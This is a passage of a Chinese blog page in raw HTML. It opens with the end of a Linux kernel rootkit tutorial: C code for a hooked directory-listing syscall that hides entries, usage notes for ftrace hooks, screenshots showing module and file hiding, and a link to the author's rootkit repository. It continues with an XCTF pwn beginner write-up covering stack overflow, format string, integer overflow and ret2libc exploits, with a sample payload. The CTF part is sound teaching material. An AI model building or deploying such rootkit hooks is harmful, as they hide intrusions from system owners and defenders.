&#125;</span><br><span class="line">			<span class="keyword">if</span>(current_dir == dirent_ker)</span><br><span class="line">			&#123;</span><br><span class="line">				ret -= current_dir-&gt;d_reclen;</span><br><span class="line">				memmove(current_dir, (<span class="type">void</span> *)current_dir + current_dir-&gt;d_reclen, ret);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			previous_dir-&gt;d_reclen += current_dir-&gt;d_reclen;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			previous_dir = current_dir;</span><br><span class="line">		&#125;</span><br><span class="line">		offset += current_dir-&gt;d_reclen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = copy_to_user(dirent, dirent_ker, ret);</span><br><span class="line">	<span class="keyword">if</span>(error)</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">&quot;error 3\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">	kfree(dirent_ker);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="十、ftrace使用方法"><a href="#十、ftrace使用方法" class="headerlink" title="十、ftrace使用方法"></a>十、ftrace使用方法</h1><p>   <strong>1、导入头文件<code>ftrace_helper.h</code></strong>  </p>
<p>   <strong>2、定义一个<code>ftrace_hook hooks</code>结构体数组，如下所示：</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_hook</span> <span class="title">hooks</span>[] =</span> &#123;</span><br><span class="line">	HOOK(<span class="string">&quot;sys_mkdir&quot;</span>,hook_mkdir,&amp;orig_mkdir),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>   <strong>调用<code> fh_install_hooks</code>函数挂钩，调用<code>fh_remove_hooks</code>函数解挂即可</strong></p>
<hr>
<h1 id="十一、其他"><a href="#十一、其他" class="headerlink" title="十一、其他"></a>十一、其他</h1><p>   <strong>1、在<code>linux kernel 4.17</code>之后，系统调用函数的参数全部存储在<code>pt_reg</code>结构体中，要实际访问到其参数，需要去读取该结构体</strong>  </p>
<p>   <strong>2、由于rootkit运行在内核空间中，要访问用户空间的数据，需要使用<code>strncpy_from_user</code>等函数将用户空间的变量拷贝到内核空间中</strong>  </p>
<p>   <strong>3、要申请内核空间，不能使用<code>malloc</code>，而是要使用<code>kmalloc</code>等函数来申请</strong>  </p>
<hr>
<h1 id="十二、linux-kernel-rootkit使用截图"><a href="#十二、linux-kernel-rootkit使用截图" class="headerlink" title="十二、linux kernel rootkit使用截图"></a>十二、linux kernel rootkit使用截图</h1><p>   <strong>1、命令执行</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/4.png">  </p>
<p>  <strong>2、隐藏内核模块</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/5.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/6.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/7.png">  </p>
<p>   <strong>3、隐藏文件</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/8.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/9.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/10.png">  </p>
<hr>
<h1 id="十三、github以及参考连接"><a href="#十三、github以及参考连接" class="headerlink" title="十三、github以及参考连接"></a>十三、github以及参考连接</h1><p>   <strong>1、github链接：</strong>  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/windy-purple/linux_kernel_rootkit">https://github.com/windy-purple/linux_kernel_rootkit</a></p>
<p>   <strong>2、参考链接：</strong>  </p>
<p><a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/03/18/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x-2/">https://memset.wordpress.com/2011/03/18/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x-2/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/39502198/finding-the-sys-call-table-in-memory-64-bit-on-4-x-x-kernel">https://stackoverflow.com/questions/39502198/finding-the-sys-call-table-in-memory-64-bit-on-4-x-x-kernel</a>  </p>
<p><a target="_blank" rel="noopener" href="https://xcellerator.github.io/posts/linux_rootkits_01/">https://xcellerator.github.io/posts/linux_rootkits_01&#x2F;</a>  </p>
<p><a target="_blank" rel="noopener" href="https://syscalls64.paolostivanin.com/">https://syscalls64.paolostivanin.com/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/vkobel/linux-syscall-hook-rootkit">https://github.com/vkobel/linux-syscall-hook-rootkit</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yeshennet/article/details/82315604">https://blog.csdn.net/yeshennet/article/details/82315604</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241090">https://www.anquanke.com/post/id/241090</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.codeleading.com/article/24384639787/">https://www.codeleading.com/article/24384639787/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/embedded-linux/p/7439984.html">https://www.cnblogs.com/embedded-linux/p/7439984.html</a>  </p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/58821458/error-passing-argument-1-of-kthread-create-on-node-from-incompatible-pointer">https://stackoverflow.com/questions/58821458/error-passing-argument-1-of-kthread-create-on-node-from-incompatible-pointer</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30624591/article/details/109685620">https://blog.csdn.net/qq_30624591&#x2F;article&#x2F;details&#x2F;109685620</a>  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/abysamross/simple-linux-kernel-tcp-client-server">https://github.com/abysamross/simple-linux-kernel-tcp-client-server</a>  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/croemheld/lkm-rootkit">https://github.com/croemheld/lkm-rootkit</a>  </p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/llj098/752417">https://gist.github.com/llj098/752417</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miaohongyu1/article/details/16986053">https://blog.csdn.net/miaohongyu1/article/details/16986053</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.ichenfu.com/2017/01/16/kernel-sock-client-example/">https://www.ichenfu.com/2017/01/16/kernel-sock-client-example/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whshiyun/article/details/82013181">https://blog.csdn.net/whshiyun/article/details/82013181</a>  </p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/459022">https://developer.aliyun.com/article/459022</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/98448435">https://blog.csdn.net/whatday/article/details/98448435</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2022/01/20/49/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/20/49/" class="post-title-link" itemprop="url">XCTF pwn新手区解题记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-20 22:12:49" itemprop="dateCreated datePublished" datetime="2022-01-20T22:12:49+08:00">2022-01-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:11:51" itemprop="dateModified" datetime="2024-11-12T23:11:51+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>闲来无事，刷刷ctf题</strong></p>
<hr>
<h1 id="二、题目-level0"><a href="#二、题目-level0" class="headerlink" title="二、题目: level0"></a>二、题目: level0</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、下载好题目后，拖入到kali中去，用<code>file</code>和<code>checksec</code>查看一下，可以发现该程序是<code>64位</code>，只开了<code>NX</code>保护，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/1.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、拖入到<code>IDA</code>中去，发现在<code>main</code>函数中打印出信息后就调用了<code>vulnerable_function</code>函数，跟进<code>vulnerable_function</code>函数，可以发现<code>read</code>函数处为栈溢出漏洞，并且可以得知该<code>buf</code>数组距离<code>ebp</code>为<code>0x80</code>个字节，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/2.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/3.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、通过<code>IDA</code>，可以发现程序中存在一个名为<code>callsystem</code>的函数，可以直接<code>getshell</code>，有了这个加上上面的偏移量，就可以直接编写<code>exp</code>，<code>exp</code>执行结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/4.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/5.png">  </p>
<hr>
<h1 id="三、题目-level2"><a href="#三、题目-level2" class="headerlink" title="三、题目: level2"></a>三、题目: level2</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、下载好题目后，首先使用<code>file</code>和<code>chseksec</code>，可以发现程序是<code>32</code>位并且开了<code>NX</code>的，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/6.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、拖入到<code>IDA</code>当中去，可以发现程序首先调用<code>vulnerable_function</code>函数后就打印一串字符串就结束了，跟进到<code>vulnerable_function</code>中去，可以发现<code>read</code>存在栈溢出，并且<code>buf</code>距离<code>ebp</code>为<code>0x88</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/7.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/8.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、上面我们找到了<code>buf</code>距离<code>返回地址</code>的偏移量(0x88+4),仔细观察，我们可以发现存在<code>_system</code>函数可以<code>getshell</code>，跟进去该函数后，可以发现，需要传入字符串<code>/bin/sh</code>作为参数才能<code>getshell</code>，使用快捷键<code>shift+F12</code>调出字符串界面，发现了该字符串，那么我们的<code>payload</code>应该为<code>0x8C * b&#39;A&#39; + p32(_system函数地址) + p32(0) + p32(/bin/sh字符串地址)</code>(PS:这里之所以有一个<code>p32(0)</code>，是因为我们正常调用一个函数时，栈从高到底的结构为：参数 返回地址 ebp，所以这里我们需要提供一个虚假的返回地址以模拟正常的调用过程)，最后<code>exp</code>执行结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/9.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/10.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/11.png">  </p>
<hr>
<h1 id="四、题目-string"><a href="#四、题目-string" class="headerlink" title="四、题目: string"></a>四、题目: string</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、下载好题目后，拖入到kali中去，用<code>file</code>和<code>checksec</code>查看一下，可以发现该程序是<code>64位</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/12.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、将程序拖入到<code>IDA</code>中去，在<code>main</code>函数中，首先调用<code>alarm</code>函数设置了<code>0x3C</code>秒后关闭程序，然后给变量<code>v4</code>申请了<code>8个字节</code>的空间，并且给<code>v4[0]</code>赋值为<code>68</code>、<code>v4[1]</code>赋值为<code>85</code>，之后就是调用<code>puts</code>函数打印一些信息，然后就调用<code>sub_400D72</code>函数，并且将<code>v4</code>数组作为参数传入，之后<code>main</code>函数就结束退出了，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/13.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、跟进<code>sub_400D72</code>中去，该函数首先要求输入一个名字，如果长度小于等于<code>0xC</code>，则创建一个角色，然后依次调用<code>sub_400A7D</code>、<code>sub_400BB9</code>、<code>sub_400CA6</code>函数，否则就退出，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/14.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、跟进到<code>sub_400A7D</code>中去，该函数只有输入<code>east</code>才能正常返回，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/15.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>5、接着跟进到<code>sub_400BB9</code>中去，该函数首先要求我们输入一个数字，如果输入的数字为<code>1</code>，则进入一个<code>if</code>里面去，在该<code>if</code>块里面，首先要求输入一个数字，然后要求输入一串字符串，紧接着该函数直接将该字符串作为参数传入到<code>printf</code>函数中去了，很明显的格式化字符串漏洞，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/16.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>6、接着分析一下<code>sub_400CA6</code>，该函数首先调用<code>puts</code>函数打印一些信息，然后判断参数数组<code>a[0]</code>是否等于<code>a[1]</code>，如果相等，则申请一片空间，然后通过<code>read</code>函数获取用户输入写入到刚刚申请到的空间中，然后把该空间中的值作为一段代码执行，而这里的参数数组就是<code>main</code>函数的<code>v4</code>数组，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/17.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>7、有了上面的分析，可以很明显得出解题的方法，首先利用格式化字符串漏洞，将<code>v4[0]=v4[1]</code>，然后写入<code>shellcode</code>来<code>getshell</code>，首先我们来寻找一下偏移量，执行程序，输入名字之后，输入<code>east</code>，然后输入<code>1</code>，之后输入<code>payload</code>测试偏移量，从下图可以看出，偏移量为<code>8</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/18.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>8、有了偏移量，就可以写<code>exp</code>了，但这里有一个小坑，<code>__isoc99_scanf</code>函数这里前几个字节没办法直接作为地址写入(PS:事后对比了其他师傅的wp，发现<code>IDA</code>反编译出来的内容都有点不同，不知道是不是这个原因)，这里使用代码中前面输入那个地址，偏移量为<code>7</code>，在上面的图片中已标注，执行<code>exp</code>，结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/19.png">  </p>
<hr>
<h1 id="五、题目-guess-num"><a href="#五、题目-guess-num" class="headerlink" title="五、题目: guess_num"></a>五、题目: guess_num</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、首先下载好题目，拖入kali中查看一下基础信息，可以发现为<code>64位</code>的程序，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/20.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、拖进<code>IDA</code>中，发现程序首先生成了一个随机种子，然后调用<code>gets</code>函数获取输入，典型的栈溢出漏洞，但前面保护全开，也没法直接覆盖返回地址来<code>rce</code>，往下接着看，要求用户练着猜10次并且全部正确就可以得到<code>flag</code>，前面存在一个栈溢出，虽然没办法来<code>rce</code>，但可以用来覆盖随机化种子，有了种子，我们就可以直接提前计算出来随机值，而<code>gets</code>输入距离种子偏移量为<code>0x20</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/21.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/22.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、直接使用c算出随机值，然后<code>nc</code>连接上去即可得到<code>flag</code>(PS:不知道我的python脚本为啥一直得不到flag，这里就直接简单粗暴的nc连接了)，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/23.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/24.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/25.png">  </p>
<hr>
<h1 id="六、题目-get-shell"><a href="#六、题目-get-shell" class="headerlink" title="六、题目: get_shell"></a>六、题目: get_shell</h1><p>&ensp;&ensp;&ensp;&ensp;<strong><code>nc</code>连接即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/26.png">  </p>
<hr>
<h1 id="七、题目-int-overflow"><a href="#七、题目-int-overflow" class="headerlink" title="七、题目: int_overflow"></a>七、题目: int_overflow</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、还是首先拖入到<code>kali</code>中查看一下基础信息，可以发现是<code>32</code>位的程序，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/27.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、运行一下程序，没发现什么有意思的东西，拖入到<code>IDA</code>中去，根据运行时的字符串，定位到了<code>main</code>函数中去，分析一下<code>main</code>函数，就是一个登录流程，没什么可疑的地方，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/28.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/29.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、跟进到<code>login</code>函数中去，可以发现最多可以输入<code>0x199</code>大小的密码，其余地方也没什么可疑的，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/30.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、跟进到<code>check_passwd</code>函数中去，首先可以发现当中的<code>v3</code>变量大小是一字节，然后程序将密码字符串的大小赋值给了<code>v3</code>，之后判断<code>v3</code>是否小于3，大于8，如果是，就退出，否则就打印信息并将密码拷贝到<code>dest</code>数组中去，结合题目名的提醒，可以发现这里存在整数溢出漏洞，可以绕过其对<code>v3</code>的判断，然后栈溢出覆盖返回地址，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/31.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>5、那么<code>v3</code>等于多少时能绕过喃，这里<code>v3</code>只有一个字节大小，所以我们只需要使我们输入的密码长度的最后一个字节为<code>4,5,6,7,8</code>之中的一个即可，这里密码最多可输入<code>0x199</code>字节，写一个判断脚本跑一下所有可能，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/32.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>6、这里选择第一个<code>260</code>，接下来我们还需要偏移量，<code>IDA</code>已经给出了，为<code>0x14</code>到<code>ebp</code>，那么我们覆盖<code>0x18</code>字节之后即可覆盖返回地址，在该程序中，还存在一个直接获取<code>flag</code>的函数<code>what_is_this</code>，我们直接将返回地址覆盖为这个函数地址即可拿到<code>flag</code>，<code>exp</code>执行结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/34.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/33.png">  </p>
<hr>
<h1 id="八、题目-cgpwn2"><a href="#八、题目-cgpwn2" class="headerlink" title="八、题目: cgpwn2"></a>八、题目: cgpwn2</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、下载好题目之后，拖入<code>kali</code>中简单查看一下程序信息，可以发现该程序为<code>32位</code>，并且开了<code>NX</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/35.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、将程序拖入到<code>IDA</code>中，首先查看<code>main</code>函数，该函数没什么可疑的，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/36.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、跟进到<code>hello</code>函数中去，可以发现在函数末尾调用了<code>gets</code>函数，很明显的栈溢出，并且从<code>IDA</code>反编译的结果我们可以知道数组<code>s</code>距离<code>ebp</code>为<code>0x26</code>，也就是说<code>0x26 + 4</code>个字节的偏移量后即可覆盖到返回地址，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/37.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、因为题目开了<code>NX</code>，没办法在栈上直接部署<code>shellcode</code>来执行，仔细观察，我们发现提供了<code>system</code>函数，但是没有提供<code>/bin/sh</code>字符串，我们只要想办法制造一个<code>/bin/sh</code>字符串即可<code>getshell</code>，在<code>hello</code>函数中，程序还调用了<code>fgets</code>函数获取输入储存到<code>name</code>变量中，查看<code>name</code>位置可以发现<code>name</code>位于<code>bss</code>段中，那么<code>exp</code>的思路就是首先在程序调用<code>fgets</code>处输入<code>/bin/sh;</code>字符串，然后再调用<code>gets</code>函数处溢出覆盖返回地址为<code>system</code>函数地址，<code>exp</code>执行结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/38.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/39.png">  </p>
<hr>
<h1 id="九、题目-level3"><a href="#九、题目-level3" class="headerlink" title="九、题目: level3"></a>九、题目: level3</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、下载好题目，拖入到<code>kali</code>中去，查看一下程序的基本信息，可以发现程序为<code>32位</code>的，并且开了<code>NX</code>,如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/40.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、将程序拖入到<code>IDA</code>中去，首先看一下<code>main</code>函数，<code>main</code>函数首先调用了一个<code>vulnerable_function</code>函数，然后就是调用了<code>write</code>输出信息到控制台中，没什么存在漏洞的地方，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/41.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、跟进到<code>vulnerable_function</code>函数中去，可以发现该函数调用的<code>read</code>函数存在栈溢出，并且<code>IDA</code>已经计算出来<code>buf</code>距离<code>ebp</code>为<code>0x88</code>，那么覆盖<code>0x88 + 4 = 0x8C</code>个字节之后即可覆盖返回地址，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/42.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、仔细观察该程序，可以发现没有<code>system</code>等现成的函数可以让我们直接<code>getshell</code>，但是存在<code>libc</code>和已经调用过的<code>write</code>函数，并且题目还给了<code>libc.so</code>文件，那么思路就很明显了，首先栈溢出调用<code>write</code>函数输出<code>write</code>函数的地址，进而获取到<code>libc</code>的基地址，因为<code>libc.so</code>中存在<code>system</code>函数和<code>/bin/sh</code>字符串的偏移地址，加上基地址就可以得到对应的绝对地址，之后再栈溢出调用<code>write</code>时将返回地址设置为<code>vulnerable_function</code>函数的首地址，再次栈溢出覆盖返回地址为前面计算出的<code>system</code>的绝对地址即可<code>getshell</code>，<code>exp</code>执行结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/43.png">  </p>
<hr>
<h1 id="十、题目-cgfsb"><a href="#十、题目-cgfsb" class="headerlink" title="十、题目: cgfsb"></a>十、题目: cgfsb</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、下载好题目，拖入到<code>kali</code>中去，查看一下程序的基本信息，可以发现程序为<code>32位</code>的，并且开了<code>NX</code>,如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/44.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>2、拖入到<code>IDA</code>中去，可以发现程序首先要求我们输入一个名字，然后输入一串信息，之后直接将信息作为传入到了<code>printf</code>函数里面去了，典型的格式化字符串漏洞，之后则判断<code>pwnme</code>变量是否等于<code>8</code>，如果等于<code>8</code>，则输出<code>flag</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/45.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、经过上面的分析，那么解题的思路就很明显了，利用格式化字符串漏洞将<code>pwnme</code>变量修改为<code>8</code>即可。那么现在需要确定两个东西，一个是偏移量，另一个是<code>pwnme</code>变量的地址，仔细观察可发现，<code>pwnme</code>变量不是函数局部变量，而是<code>bss</code>段的一个变量，双击变量名即可获得地址，至于偏移量怎么确定，这么不过多叙述了，不明白的可以看我上一篇文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/aWxvdmVseXc0/p/15734510.html">https://www.cnblogs.com/aWxvdmVseXc0/p/15734510.html</a>，这里计算出来偏移量为<code>10</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/46.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/47.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>4、最后<code>exp</code>执行结果如下所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/48.png">  </p>
<hr>
<h1 id="十一、题目-hellopwn"><a href="#十一、题目-hellopwn" class="headerlink" title="十一、题目: hellopwn"></a>十一、题目: hellopwn</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>1、下载好题目，拖入到<code>kali</code>中去，查看一下程序的基本信息，可以发现程序为<code>64位</code>的，并且开了<code>NX</code>,如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/49.png">  </p>
